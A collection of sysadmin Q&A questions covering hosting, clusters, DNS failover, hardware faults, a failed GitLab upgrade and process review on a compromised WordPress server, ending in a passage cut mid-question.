"912078","Using cheap unlimited hosting as ftp backup location?","<p>I was looking for the best/cheapest FTP storage to store my server backups on, and I came across several very cheap unlimited hosting plans including ftp and ssh access. </p>

<p>I'm talking about shared website hosting plans for less than $10/month with unlimited disk space and network volume. As these plans include ftp, I could technically use it as a backup location. I would only use it as a plan B (my main backup plan is using a more reliable location), but it would accumulate to at least 1TB of data rather quickly.</p>

<p>It looks like too good to be true, to have unlimited storage for &lt; $10/month. So what's the catch? I don't see anything on the website telling me this use case is not allowed, but I haven't read through all legal documents...  Of course I could set up a small website on that hosting, just so it's really used to host a website (and also a lot of backups).</p>
","<ftp><hosting>","2018-05-14 08:26:53"
"1030856","Using HPC managers like Slurm on multiple servers in LAN","<p>I have access to a group of servers connected with a 1Gb LAN, and each of them has 40+ cores and Ubuntu OS. They all have a common NAS. I installed SLURM on a few of them and configured it so that each server is both a control and a compute node, and the servers are not connected. The required analyses are bioinformatic and are CPU bound but with files in GB. My questions are as following:</p>
<ol>
<li>This is not a compute cluster, correct? What would be needed to link these servers into a single cluster?</li>
<li>Is it a valid practice to use HPC managers like Slurm on this configuration? How would the data be shared? They do have a common NAS, but running any computations on the NAS directly is very slow compared to the local files.</li>
</ol>
<p>My ideal solution would pull the files to a local machine (ideally regardless of their location, but NAS could be the common hub) perform the computation and possibly return the output files. Is this an unreasonable request or a solved problem?</p>
<p>Thanks in advance!</p>
","<linux><hpc><slurm>","2020-08-20 08:15:13"
"839404","Use DNS or similar to re-route URL shortener service when dedicated server is down","<p>I am trying to make a link shortener resilient to server failure by re-routing to a good server.</p>

<p>Example:</p>

<ol>
<li>shortener.com/a1b2c3 > forwards to > website1.com  </li>
</ol>

<p>(shortener.com and website1.com are on different dedicated servers)</p>

<ol start=""2"">
<li><p>For argument's sake, lets say the <a href=""http://shortener.com"" rel=""nofollow noreferrer"">http://shortener.com</a> link is posted to Twitter. So the user journey is twitter.com > shortener.com > website1.com</p></li>
<li><p>Can I use DNS or some top layer infrastructure to detect shortener.com server is down and use alternative, to re-route traffic to website1.com?</p></li>
</ol>

<p><a href=""https://i.sstatic.net/BBmHF.png"" rel=""nofollow noreferrer"">Link to show diagram of two scenarios</a></p>
","<domain-name-system><ip><load-balancing><domain-name><dns-zone>","2017-03-20 12:59:20"
"912205","Do I need a router even though I have an Windows Server with AD DS?","<p>I am a newbie playing around with basic networking and Active Directory. I have successfully setup Windows Server w/ AD DS. The Windows Server runs DHCP, DNS, etc.</p>

<p>However, for my ISP provided modem/router, I believe I should be setting this to Bridge Mode since the Windows Server would handle the routing. Is this thinking incorrect, and should I be keeping my ISP provided modem/router unbridged with DHCP disabled? </p>

<p>Thanks in advance</p>
","<networking><active-directory>","2018-05-14 23:54:23"
"912283","Can mixing RAM memory size (on its own) reduce dual channel performance?","<p>I am considering purchasing a new laptop, specifically the Lenovo ThinkPad t580, which offers multiple memory configurations up to dual channel. Two of the many memory options (on the UK website) are:</p>

<p>16GB (8+8) DDR4 2400MHz SODIMM</p>

<p>24GB (8+16) DDR4 2400MHz SODIMM</p>

<p>When less than 16GB is in use, can the larger mixed 24GB(8+16) configuration ever perform worse than the matched 16GB(8+8) configuration?  Or will the 24GB(8+16) behave exactly like 16GB(8+8) for the first 16GB of memory used?</p>

<p>There have been plenty of questions about mixing different sizes, speeds and brands of RAM, but in this case I would expect that the only difference between the 2 sticks of RAM would be the size. Also, I am only asking about the first 16GB of memory used, not the region from 16GB to 24GB, where I expect the larger, but mixed configuration would have the advantage for page fault reasons.</p>

<p>This laptop is <em>not</em> for gaming, but will potentially be hosting multiple databases (SQL Server, Oracle, SAP HANA) and virtual systems.</p>
","<performance><memory>","2018-05-15 09:56:14"
"1031117","Server shutdown when stress","<p>Today I have a little problem. I have a local server in my house, for testing and virtualization. It has a Supermicro X8DT3-LN4F board and two Intel Xeon x5680 processors.</p>
<p>The problem is that when it suffers a lot of CPU consumption, for example in Linux performing tests from the terminal with <code>stress</code> or in Windows I tried a mining program, the board begins to beep and beep until the entire system shuts down.</p>
<p>I have not been in a similar situation before, normally when the processor has many processes it just stops them. I am a bit lost, any help or solution is welcome.</p>
","<linux><windows><security><supermicro><xeon>","2020-08-22 19:42:27"
"1031205","Why shouldn't I host my web server on my own PC?","<p>If this is a terrible question, then I'm sorry but please don't down-vote me into oblivion lol. I also searched but figured it deserved it's own thread because my specs aren't the same as any I saw listed.</p>
<p>Anyways, I've ran dedicated servers for years and paying for them monthly is adding up, as my sites aren't running ads. I need to run 6 automated WordPress blogs and a small crypto-trading and management platform. What would be the down-sides of hosting my own web server? I don't game or anything, so I'm not worried about it using my resources. Are there any game-changers that remove it from being a decent viable option? Is there a good Docker for web-hosting or will I need to spin up a new Linux VM?</p>
<p>Pros:</p>
<ul>
<li><p>Gigabit connection that's always wide-open</p>
</li>
<li><p>32GB DDR4 RAM</p>
</li>
<li><p>Ryzen 7 - 3.9 GHz</p>
</li>
<li><p>30 TB Storage</p>
<ul>
<li><p>--&gt; 5 TB NVMe Storage - Most data will be hosted here.</p>
</li>
<li><p>--&gt; 5 TB SSD Storage - Maybe use this for RAID?</p>
</li>
<li><p>--&gt; 20 TB HDD Storage - Videos will be hosted here.</p>
</li>
</ul>
</li>
</ul>
<p>Cons:</p>
<ul>
<li>Windows 10 (but I can create VM or Docker)</li>
</ul>
<p>That would save a good bit of money per month if I were to rent a server with comparable specs.</p>
","<web-server><web-hosting>","2020-08-24 00:48:47"
"1031227","HTTP over SSH, similar to SFTP","<p>I have learnt about the following protocols.</p>
<ol>
<li><p>SFTP - FTP over SSH (application layer)</p>
</li>
<li><p>FTPS - FTP over SSL (transport layer)</p>
</li>
<li><p>HTTPS - HTTP over SSL (transport layer)</p>
</li>
</ol>
<p>Is there an SSH counterpart for HTTPS, like SFTP for FTPS?</p>
<p>I've heard about SHTTP, but -</p>
<ol>
<li><p>It was referred to as an obsolete alternative to HTTPS (SFTP wasn't).</p>
</li>
<li><p>I don't know if (and I don't think) it has anything to do with SSH. I've seen it put with SSL instead.</p>
</li>
</ol>
<p>If there IS one, why isn't it talked about as much as SFTP?</p>
","<ssh><ssl>","2020-08-24 08:09:37"
"963141","How to Open Telnet Console in post section of Kickstart","<p>I want to configure external VxWork based device in post section of kickstart file, this accept telnet based commands. I found following</p>

<pre><code>#!/usr/bin/expect -f
send -- ""terminal length 0\r""
expect ""*?EDR*""
spawn timeout 600 ssh -o admin@x.x.x.x
match_max 1000
send -- ""copy tftp x.x.x.x my.ini\r""
expect ""*?AAA*""
exit
</code></pre>

<p>Any other alternative?</p>
","<ssh><centos7><telnet><kickstart>","2019-04-15 14:46:48"
"912542","How to check TLS version used while session is open during a connection","<p>I am using an ec2 linux machine.  How do I check the TLS / SSL version from the command line or browser?</p>
","<linux><amazon-ec2><ssl>","2018-05-16 17:19:39"
"912632","Random shutdown, then doesn't power-on until power-plug is pulled out from wall and plugged back in","<p>We have a workstation machine which, for the past three days, shuts down (apparently) randomly. After it shuts down, if you press the power button, the machine won't start. However, if you pull out the power plug from the wall socket end, again put it back in, and then power-on the machine, it would start. Nothing else, but this action, would make it start. </p>

<p>The machine is connected to the wall power socket, through a <a href=""https://www.amazon.in/Belkin-Essential-F9E300zb1-5MGRY-3-Socket-Protector/dp/B007T5S04M"" rel=""nofollow noreferrer"">Belkin spike protector</a> strip. The wall power socket is connected to a common 10 kVa UPS. Other machines running in similar setups are working fine. </p>

<p>I have changed the machine's power cable and the spike protector strip. Same situation continues. The machine runs Windows XP SP3. The machine is not connected to the internet and is used to run a Windows application over the LAN (which is not connected to the Internet too.)</p>

<p><strong>Other specs of the machine :</strong> </p>

<p><a href=""https://ark.intel.com/products/36503/Intel-Core2-Duo-Processor-E7500-3M-Cache-2_93-GHz-1066-MHz-FSB"" rel=""nofollow noreferrer"">Intel Core 2 Duo E7500, 2.93GHz</a>, ST3160310CS 150GB HDD, 
DDR2, 2GB RAM, Kingston 
<a href=""https://ark.intel.com/products/50375/Intel-Desktop-Board-DG31PR"" rel=""nofollow noreferrer"">Intel DG31PR Motherboard</a></p>

<p>Before I open the machine and check with RAM or SMPS, I wish to know what could possibly be the issue and how it is caused ? </p>

<p>This is not the first time I am facing this issue, though I don't remember the cause or solution from years back. :-) </p>

<p><strong>Other possibly related context :</strong> </p>

<p>The monitor connected to the machine has these wavy forms possibly related to power. The wavy pattern is somewhat noticeable, but not hampering work by the tolerant user :-) . Another monitor connected to the same machine also had the same issue. Changing refresh rates didn't have any positive change in the issue. </p>
","<memory><power-supply-unit><unexpected-shutdown>","2018-05-17 07:05:33"
"839939","Please help identify any weird processes","<p>I'm in need of a hand. We recently had a server compromise and manage to do a nice clean but I'm trying to get rid of the bug without moving server. </p>

<p>Can anybody review the running processes below and possibly <strong>point out anything deemed weird/unusual.</strong> <strong>The hacker did manage to obtain SSH access</strong> and changed many group permissions. </p>

<p>It's a simple website running WordPress. small traffic. Wordfence experts &amp; others cannot determine some things. Thanks in advance</p>

<pre><code>UID        PID  PPID  C STIME TTY          TIME CMD
root         1     0  0 Mar17 ?        00:00:02 /sbin/init
root         2     0  0 Mar17 ?        00:00:00 [kthreadd]
root         3     2  0 Mar17 ?        00:00:05 [migration/0]
root         4     2  0 Mar17 ?        00:00:05 [ksoftirqd/0]
root         5     2  0 Mar17 ?        00:00:00 [stopper/0]
root         6     2  0 Mar17 ?        00:00:01 [watchdog/0]
root         7     2  0 Mar17 ?        00:00:03 [migration/1]
root         8     2  0 Mar17 ?        00:00:00 [stopper/1]
root         9     2  0 Mar17 ?        00:00:03 [ksoftirqd/1]
root        10     2  0 Mar17 ?        00:00:00 [watchdog/1]
root        11     2  0 Mar17 ?        00:00:42 [events/0]
root        12     2  0 Mar17 ?        00:00:39 [events/1]
root        13     2  0 Mar17 ?        00:00:00 [events/0]
root        14     2  0 Mar17 ?        00:00:00 [events/1]
root        15     2  0 Mar17 ?        00:00:00 [events_long/0]
root        16     2  0 Mar17 ?        00:00:00 [events_long/1]
root        17     2  0 Mar17 ?        00:00:00 [events_power_ef]
root        18     2  0 Mar17 ?        00:00:00 [events_power_ef]
root        19     2  0 Mar17 ?        00:00:00 [cgroup]
root        20     2  0 Mar17 ?        00:00:00 [khelper]
root        21     2  0 Mar17 ?        00:00:00 [netns]
root        22     2  0 Mar17 ?        00:00:00 [async/mgr]
root        23     2  0 Mar17 ?        00:00:00 [pm]
root        24     2  0 Mar17 ?        00:00:01 [sync_supers]
root        25     2  0 Mar17 ?        00:00:02 [bdi-default]
root        26     2  0 Mar17 ?        00:00:00 [kintegrityd/0]
root        27     2  0 Mar17 ?        00:00:00 [kintegrityd/1]
root        28     2  0 Mar17 ?        00:01:03 [kblockd/0]
root        29     2  0 Mar17 ?        00:00:02 [kblockd/1]
root        30     2  0 Mar17 ?        00:00:00 [kacpid]
root        31     2  0 Mar17 ?        00:00:00 [kacpi_notify]
root        32     2  0 Mar17 ?        00:00:00 [kacpi_hotplug]
root        33     2  0 Mar17 ?        00:00:00 [ata_aux]
root        34     2  0 Mar17 ?        00:00:00 [ata_sff/0]
root        35     2  0 Mar17 ?        00:00:00 [ata_sff/1]
root        36     2  0 Mar17 ?        00:00:00 [ksuspend_usbd]
root        37     2  0 Mar17 ?        00:00:00 [khubd]
root        38     2  0 Mar17 ?        00:00:00 [kseriod]
root        39     2  0 Mar17 ?        00:00:00 [md/0]
root        40     2  0 Mar17 ?        00:00:00 [md/1]
root        41     2  0 Mar17 ?        00:00:00 [md_misc/0]
root        42     2  0 Mar17 ?        00:00:00 [md_misc/1]
root        43     2  0 Mar17 ?        00:00:00 [linkwatch]
root        44     2  0 Mar17 ?        00:00:00 [khungtaskd]
root        45     2  0 Mar17 ?        00:01:01 [kswapd0]
root        46     2  0 Mar17 ?        00:00:00 [ksmd]
root        47     2  0 Mar17 ?        00:00:01 [khugepaged]
root        48     2  0 Mar17 ?        00:00:00 [aio/0]
root        49     2  0 Mar17 ?        00:00:00 [aio/1]
root        50     2  0 Mar17 ?        00:00:00 [crypto/0]
root        51     2  0 Mar17 ?        00:00:00 [crypto/1]
root        58     2  0 Mar17 ?        00:00:00 [kthrotld/0]
root        59     2  0 Mar17 ?        00:00:00 [kthrotld/1]
root        61     2  0 Mar17 ?        00:00:00 [kpsmoused]
root        62     2  0 Mar17 ?        00:00:00 [usbhid_resumer]
root        63     2  0 Mar17 ?        00:00:00 [deferwq]
root       250     2  0 Mar17 ?        00:00:00 [scsi_eh_0]
root       254     2  0 Mar17 ?        00:00:00 [scsi_eh_1]
root       305  1419  0 Mar21 ?        00:00:00 sshd: root [priv]
sshd       306   305  0 Mar21 ?        00:00:00 sshd: root [net]
root       349     2  0 Mar17 ?        00:00:00 [virtio-blk]
root       379     2  0 Mar17 ?        00:01:37 [jbd2/vda1-8]
root       380     2  0 Mar17 ?        00:00:00 [ext4-dio-unwrit]
root       458     1  0 Mar17 ?        00:00:00 /sbin/udevd -d
root       563     2  0 Mar17 ?        00:00:00 [virtio-net]
root       586     2  0 Mar17 ?        00:00:00 [vballoon]
root       742     2  0 Mar17 ?        00:00:00 [kdmremove]
root       743     2  0 Mar17 ?        00:00:00 [kstriped]
root       769     2  0 Mar17 ?        00:01:08 [flush-253:0]
nobody     837 11478  0 14:29 ?        00:00:00 /usr/sbin/httpd -k start
root       992     2  0 Mar17 ?        00:00:01 [kauditd]
root      1047     2  0 Mar17 ?        00:00:13 [loop0]
root      1051     2  0 Mar17 ?        00:00:05 [kjournald]
root      1071  1419  0 Mar18 ?        00:00:00 sshd: unknown [priv]
sshd      1072  1071  0 Mar18 ?        00:00:00 sshd: unknown [net]
root      1230     1  0 Mar17 ?        00:00:01 auditd
root      1294     1  0 Mar17 ?        00:00:40 /sbin/rsyslogd -i /var/run/syslo
named     1317     1  0 Mar17 ?        00:00:02 /usr/sbin/named -u named
dbus      1335     1  0 Mar17 ?        00:00:00 dbus-daemon --system
root      1366     1  0 Mar17 ?        00:00:00 /usr/sbin/acpid
nscd      1385     1  0 Mar17 ?        00:00:31 /usr/sbin/nscd
root      1419     1  0 Mar17 ?        00:00:00 /usr/sbin/sshd
ntp       1430     1  0 Mar17 ?        00:00:01 ntpd -u ntp:ntp -p /var/run/ntpd
root      1449     1  0 Mar17 ?        00:00:00 /bin/sh /usr/bin/mysqld_safe --d
root      1632     1  0 00:00 ?        00:00:20 lfd - sleeping
root      1711     1  0 Mar17 ?        00:00:00 pure-ftpd (SERVER)
root      1713     1  0 Mar17 ?        00:00:00 /usr/sbin/pure-authd -s /var/run
root      1725     1  0 Mar17 ?        00:00:02 crond
root      1740     1  0 Mar17 ?        00:00:00 /usr/sbin/atd
root      1875     1  0 Mar17 tty1     00:00:00 /sbin/mingetty /dev/tty1
root      1877     1  0 Mar17 tty2     00:00:00 /sbin/mingetty /dev/tty2
root      1879     1  0 Mar17 tty3     00:00:00 /sbin/mingetty /dev/tty3
root      1881     1  0 Mar17 tty4     00:00:00 /sbin/mingetty /dev/tty4
root      1883     1  0 Mar17 tty5     00:00:00 /sbin/mingetty /dev/tty5
root      1885     1  0 Mar17 tty6     00:00:00 /sbin/mingetty /dev/tty6
root      1889   458  0 Mar17 ?        00:00:00 /sbin/udevd -d
root      1890   458  0 Mar17 ?        00:00:00 /sbin/udevd -d
nobody    2733 11478  0 14:45 ?        00:00:00 /usr/sbin/httpd -k start
nobody    2736 11478  0 14:45 ?        00:00:00 /usr/sbin/httpd -k start
nobody    2739 11478  0 14:45 ?        00:00:00 /usr/sbin/httpd -k start
nobody    3264 11478  0 14:50 ?        00:00:00 /usr/sbin/httpd -k start
503       3265 11478  0 14:50 ?        00:00:00 /usr/sbin/httpd -k start
nobody    3270 11478  0 14:50 ?        00:00:00 /usr/sbin/httpd -k start
nobody    3272 11478  0 14:50 ?        00:00:00 /usr/sbin/httpd -k start
nobody    3278 11478  0 14:50 ?        00:00:00 /usr/sbin/httpd -k start
503       3577 11566 23 14:54 ?        00:00:12 php-fpm: pool mysite
root      3596  1419  0 14:54 ?        00:00:00 sshd: root@pts/0
503       3600 11566 23 14:54 ?        00:00:06 php-fpm: pool mysite
503       3602 11566 23 14:54 ?        00:00:06 php-fpm: pool mysite
root      3619  3596  0 14:54 pts/0    00:00:00 -bash
root      3670  3619  0 14:54 pts/0    00:00:00 ps -ef
root      4331  1419  0 00:52 ?        00:00:00 sshd: unknown [priv]
sshd      4332  4331  0 00:52 ?        00:00:00 sshd: unknown [net]
root      4365  1419  0 00:53 ?        00:00:00 sshd: root [priv]
sshd      4367  4365  0 00:53 ?        00:00:00 sshd: root [net]
root      4758  1419  0 Mar19 ?        00:00:00 sshd: root [priv]
sshd      4760  4758  0 Mar19 ?        00:00:00 sshd: root [net]
mysql     5024  1449  3 Mar19 ?        02:24:33 /usr/sbin/mysqld --basedir=/usr
root      7284     2  0 02:05 ?        00:00:00 [flush-7:0]
root      8078  1419  0 Mar21 ?        00:00:00 sshd: unknown [priv]
sshd      8082  8078  0 Mar21 ?        00:00:00 sshd: unknown [net]
root      9047     1  0 Mar21 ?        00:00:00 /usr/sbin/dovecot
dovenull  9049  9047  0 Mar21 ?        00:00:00 dovecot/pop3-login
dovenull  9050  9047  0 Mar21 ?        00:00:00 dovecot/imap-login
dovecot   9051  9047  0 Mar21 ?        00:00:00 dovecot/anvil
root      9052  9047  0 Mar21 ?        00:00:00 dovecot/log
dovenull  9054  9047  0 Mar21 ?        00:00:00 dovecot/pop3-login
root      9055  9047  0 Mar21 ?        00:00:00 dovecot/config
dovenull  9056  9047  0 Mar21 ?        00:00:00 dovecot/imap-login
root      9431  1419  0 Mar21 ?        00:00:00 sshd: unknown [priv]
sshd      9432  9431  0 Mar21 ?        00:00:00 sshd: unknown [net]
root      9639     1  0 Mar21 ?        00:00:07 cpsrvd (SSL) - dormant mode - ac
root      9647     1  0 Mar21 ?        00:00:05 queueprocd - wait to process a t
root      9651     1  0 Mar21 ?        00:00:01 dnsadmin - dormant mode
root      9667     1  0 Mar21 ?        00:00:07 php-fpm: master process (/usr/lo
root      9676     1  0 Mar21 ?        00:00:14 cPhulkd - processor
root      9685     1  0 Mar21 ?        00:00:00 cpdavd - accepting connections o
root      9689     1  0 Mar21 ?        00:00:00 cpanellogd - sleeping for logs
root     11396     1  0 03:42 ?        00:00:01 tailwatchd
root     11443  1419  0 Mar21 ?        00:00:00 sshd: root [priv]
sshd     11444 11443  0 Mar21 ?        00:00:00 sshd: root [net]
root     11478     1  0 03:42 ?        00:00:02 /usr/sbin/httpd -k start
root     11566     1  0 03:42 ?        00:00:04 php-fpm: master process (/opt/cp
503      12423  9047  0 11:11 ?        00:00:00 dovecot/quota-status -p postfix
root     12782  1419  0 Mar18 ?        00:00:00 sshd: root [priv]
root     12783  1419  0 Mar18 ?        00:00:00 sshd: unknown [priv]
sshd     12784 12782  0 Mar18 ?        00:00:00 sshd: root [net]
sshd     12787 12783  0 Mar18 ?        00:00:00 sshd: unknown [net]
root     12800  1419  0 Mar20 ?        00:00:00 sshd: root [priv]
sshd     12801 12800  0 Mar20 ?        00:00:00 sshd: root [net]
mailman  12890     1  0 11:17 ?        00:00:00 /usr/bin/python /usr/local/cpane
mailman  12891 12890  0 11:17 ?        00:00:01 /usr/bin/python /usr/local/cpane
mailman  12892 12890  0 11:17 ?        00:00:02 /usr/bin/python /usr/local/cpane
mailman  12893 12890  0 11:17 ?        00:00:01 /usr/bin/python /usr/local/cpane
mailman  12894 12890  0 11:17 ?        00:00:02 /usr/bin/python /usr/local/cpane
mailman  12895 12890  0 11:17 ?        00:00:01 /usr/bin/python /usr/local/cpane
mailman  12896 12890  0 11:17 ?        00:00:02 /usr/bin/python /usr/local/cpane
mailman  12897 12890  0 11:17 ?        00:00:02 /usr/bin/python /usr/local/cpane
mailman  12898 12890  0 11:17 ?        00:00:00 /usr/bin/python /usr/local/cpane
root     18367     1  0 Mar21 ?        00:00:00 /usr/bin/python -Es /usr/bin/fai
root     19644  1419  0 Mar18 ?        00:00:00 sshd: unknown [priv]
sshd     19645 19644  0 Mar18 ?        00:00:00 sshd: unknown [net]
root     19713  1419  0 Mar19 ?        00:00:00 sshd: root [priv]
sshd     19714 19713  0 Mar19 ?        00:00:00 sshd: root [net]
root     19937  1419  0 12:38 ?        00:00:00 sshd: root@pts/1
root     20109 19937  0 12:39 pts/1    00:00:00 -bash
root     20816  1419  0 12:44 ?        00:00:00 sshd: root@pts/2
root     20819 20816  0 12:44 pts/2    00:00:00 -bash
root     21666  1419  0 04:29 ?        00:00:00 sshd: root [priv]
sshd     21667 21666  0 04:29 ?        00:00:00 sshd: root [net]
root     21985  1419  0 04:33 ?        00:00:00 sshd: root [priv]
sshd     21986 21985  0 04:33 ?        00:00:00 sshd: root [net]
root     23160  1419  0 Mar18 ?        00:00:00 sshd: root [priv]
sshd     23161 23160  0 Mar18 ?        00:00:00 sshd: root [net]
root     23331  1419  0 Mar19 ?        00:00:00 sshd: unknown [priv]
sshd     23332 23331  0 Mar19 ?        00:00:00 sshd: unknown [net]
root     23409 11478  0 13:04 ?        00:00:00 /usr/local/cpanel/3rdparty/bin/p
nobody   27199 11478  0 13:32 ?        00:00:02 /usr/sbin/httpd -k start
mailnull 27668     1  0 Mar21 ?        00:00:00 /usr/sbin/exim -ps -bd -q1h -oP
root     27680     1  0 Mar21 ?        00:07:36 spamd-dormant: waiting for conne
32010    27694     1  0 Mar21 ?        00:03:11 /usr/local/cpanel/3rdparty/sbin/
root     30316  1419  0 Mar18 ?        00:00:00 sshd: root [priv]
sshd     30317 30316  0 Mar18 ?        00:00:00 sshd: root [net]
root     30837  1419  0 Mar21 ?        00:00:00 sshd: root [priv]
sshd     30838 30837  0 Mar21 ?        00:00:00 sshd: root [net]
</code></pre>
","<ssh><security><logging><hacking>","2017-03-22 15:11:05"
"839948","How to check the version of OpenLDAP installed in command line?","<p>I search many posts but do not see a good solution as simple as <code>ldap -v</code>. Many solutions I have tried but it does not work.</p>
","<openldap>","2017-03-22 15:45:41"
"963356","Getting a domain name from a squatter when I have no trademark?","<p>I am going to start a website for a blog and my profession. I am not a business and have not registered a business. I have no patents or trademarks.
<br>Basically, I'm an individual.<br><br>
However, my ideal choice of domain name is taken by huge domains.com. I think they are what you'd call cybersquatters? It's not just I who has major issues with their business model.</p>

<p>They own thousands of domains simply to profit off them when people like me need them.
My question is how can I get the domain off them? They are asking for $2100 which is frankly ridiculous.
I have heard of certain solutions, but they seem to be oriented towards those with trademarks or businesses registered with a name which the cybersqautters have nicked.</p>

<p>I just want to make clear a couple of points:</p>

<ul>
<li>Please don't tell me to get a different domain name. I am trying to get this domain off hugedomains.com, not prefix my desired name with 'the' or 'my'.</li>
<li>The domain I want is a .com gTLD</li>
<li>I do not wish to haggle with hugedomains.com</li>
</ul>

<p>Thanks for your time!</p>
","<domain><domain-name>","2019-04-16 18:22:05"
"1031541","Is Google Cloud Mumbai - Asia-south1-a/b/c facing issues due to COVID ? Unable to Create or Start an instance since 1 month","<p>Hi Is Google Cloud Mumbai (Asia-South1) facing issues due to COVID situation in Mumbai ? I am unable to create a new Compute Instance or start my old instance in all of the zones in Asia-South1 Mumbai region for over a month now in Zone A,B or C. I keep getting &quot;Not Enough Resources available in this Zone&quot;.</p>
<p>I am trying to create a 8GB RAM - 4 VCPU on E2 Platform instance with Cent OS 7 &amp; 20GB SSD Disk space.</p>
<p>I have waited for almost one month now and still no resolution of this issue. If this doesn't resolve soon it will cause a huge problem for my company from our clients. Kindly help please !</p>
","<google-compute-engine>","2020-08-26 09:27:47"
"840097","Gitlab fails to upgrade to 9th version","<p>This is what I have,</p>

<pre><code>[git]~&gt; dpkg -l | grep gitlab
rc  gitlab                               7.7.2-omnibus.5.4.2.ci-1          amd64        The full stack of gitlab
iF  gitlab-ce                            9.0.0-ce.0                        amd64        GitLab Community Edition (including NGINX, Postgres, Redis)
ii  gitlab-ci-multi-runner 
</code></pre>

<p>And this is what happens when I try to upgrade.</p>

<pre><code>  [git]~&gt; apt-get dist-upgrade
Reading package lists... Done
Building dependency tree       
Reading state information... Done
Calculating upgrade... Done
The following packages were automatically installed and are no longer required:
  linux-headers-3.13.0-101 linux-headers-3.13.0-101-generic
  linux-image-3.13.0-101-generic linux-image-extra-3.13.0-101-generic
Use 'apt-get autoremove' to remove them.
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
1 not fully installed or removed.
After this operation, 0 B of additional disk space will be used.
Do you want to continue? [Y/n] y
Setting up gitlab-ce (9.0.0-ce.0) ...


       *.                  *.
      ***                 ***
     *****               *****
    .******             *******
    ********            ********
   ,,,,,,,,,***********,,,,,,,,,
  ,,,,,,,,,,,*********,,,,,,,,,,,
  .,,,,,,,,,,,*******,,,,,,,,,,,,
      ,,,,,,,,,*****,,,,,,,,,.
         ,,,,,,,****,,,,,,
            .,,,***,,,,
                ,*,.

     _______ __  __          __
    / ____(_) /_/ /   ____ _/ /_
   / / __/ / __/ /   / __ `/ __ \
  / /_/ / / /_/ /___/ /_/ / /_/ /
  \____/_/\__/_____/\__,_/_.___/


gitlab: Thank you for installing GitLab!
gitlab: To configure and start GitLab, RUN THE FOLLOWING COMMAND:

sudo gitlab-ctl reconfigure

gitlab: GitLab should be reachable at http://git.tumo.lab
gitlab: Otherwise configure GitLab for your system by editing /etc/gitlab/gitlab.rb file
gitlab: And running reconfigure again.
gitlab: 
gitlab: For a comprehensive list of configuration options please see the Omnibus GitLab readme
gitlab: https://gitlab.com/gitlab-org/omnibus-gitlab/blob/master/README.md
gitlab: 
Checking PostgreSQL executables:Starting Chef Client, version 12.12.15
resolving cookbooks for run list: [""gitlab::postgresql-bin""]
Synchronizing Cookbooks:
  - package (0.0.0)
  - gitlab (0.0.1)
  - runit (0.14.2)
Installing Cookbook Gems:
Compiling Cookbooks...
Converging 1 resources
Recipe: gitlab::postgresql-bin
  * ruby_block[Link postgresql bin files to the correct version] action run (skipped due to only_if)

Running handlers:
Running handlers complete
Chef Client finished, 0/1 resources updated in 02 seconds
Checking PostgreSQL executables: OK
Checking for an omnibus managed postgresql: OK
Checking if we already upgraded: NOT OK
Checking for a newer version of PostgreSQL to install: OK
Upgrading PostgreSQL to 9.6.1
Checking if PostgreSQL bin files are symlinked to the expected location: OK
Toggling deploy page:cp /opt/gitlab/embedded/service/gitlab-rails/public/deploy.html /opt/gitlab/embedded/service/gitlab-rails/public/index.html
Toggling deploy page: OK
Toggling services:ok: down: logrotate: 0s, normally up
ok: down: sidekiq: 1s, normally up
Toggling services: OK
Stopping the database:ok: down: postgresql: 0s, normally up
Stopping the database: OK
Update the symlinks: OK
Creating temporary data directory:Error creating new directory: /var/opt/gitlab/postgresql/data.9.6.1
STDOUT: 
STDERR: -su: 11: /etc/profile.d/zscript.sh: function: not found
-su: 12: local: not in a function
Creating temporary data directory: NOT OK
== Fatal error ==
Please check the output
== Reverting ==
ok: down: postgresql: 1s, normally up
ok: run: postgresql: (pid 5954) 0s
== Reverted ==
== Reverted to 9.2.18. Please check output for what went wrong ==
Toggling deploy page:rm -f /opt/gitlab/embedded/service/gitlab-rails/public/index.html
Toggling deploy page: OK
Toggling services:ok: run: logrotate: (pid 5965) 0s
ok: run: sidekiq: (pid 5967) 0s
Toggling services: OK
Ensuring PostgreSQL is updated: NOT OK
Error ensuring PostgreSQL is updated. Please check the logs
dpkg: error processing package gitlab-ce (--configure):
 subprocess installed post-installation script returned error exit status 1
Errors were encountered while processing:
 gitlab-ce
E: Sub-process /usr/bin/dpkg returned an error code (1)
</code></pre>
","<ubuntu-14.04><gitlab>","2017-03-23 09:14:07"
"840106","Prevent php script from overriding php.ini","<p>How can I prevent php scripts from overriding max_execution_time value ?</p>

<p>Someone found a way to inject malicious code on a server through wordpress... We are in the process of patching the vulnerability. That php code defines :</p>

<p>@ini_set('max_execution_time', 0);
@set_time_limit(0);</p>

<p>That kept on crashing my apache server... Is there a way to disallow such override?</p>
","<php5><apache2><php.ini>","2017-03-23 10:07:18"
"912866","Pushing my configuration files to VMs. What’s a good tool to bring this under source control?","<p>I have a couple of VMs where I go and edit Nginx config files, fail2ban config files, php-fpm files etc. </p>

<p>I want to move this to source control and push it out. Sort of similar to this</p>

<p><a href=""https://zachholman.com/2010/08/dotfiles-are-meant-to-be-forked/"" rel=""nofollow noreferrer"">https://zachholman.com/2010/08/dotfiles-are-meant-to-be-forked/</a> </p>

<p>what’s a good way to do this? Are there scripts/tools to help me here? Bonus if they can restart/reload services on file change/etc. </p>
","<configuration><configuration-management><source>","2018-05-18 19:25:52"
"912936","Is it necessary to use a non-root user?","<p>I have installed nginx on my centos 7 server, now i'm going to create a server block but i wonder if it's necessary to use a non-root user?</p>

<p>I am following <a href=""https://www.digitalocean.com/community/tutorials/how-to-set-up-nginx-server-blocks-on-centos-7"" rel=""nofollow noreferrer"">this tutorial</a> on DigitalOcean and it states that i need a non-root user:</p>

<blockquote>
  <p>You will need access to a CentOS 7 server with a non-root user that has sudo privileges.</p>
</blockquote>

<p>This is my private server and i will always be the only admin of it, why can't i use root user to do it?</p>
","<nginx><centos><centos7>","2018-05-19 15:51:59"
"1031723","Python webserver for mobile app","<p>I would like to setup a python webserver for my mobile app</p>
<p>It will not serve any media, css, html, etc..
Therefore I thought about gunicorn + python app without nginx, at least for the beginning</p>
<p>The reason I'm asking is that on gunicorn site they suggest to use it behind nginx, but I assume it's for static files serving and requests buffering</p>
<p>Am I right about this...?</p>
","<nginx><amazon-web-services><python><gunicorn>","2020-08-27 11:56:46"
"913041","Website .htaccess redirection loop issue","<p>I have my news website hosted in US and it is being managed by cloudfare. I have placed one local server in Nepal as well for faster serving of web pages. MYSql replication and web content sync is being done.</p>

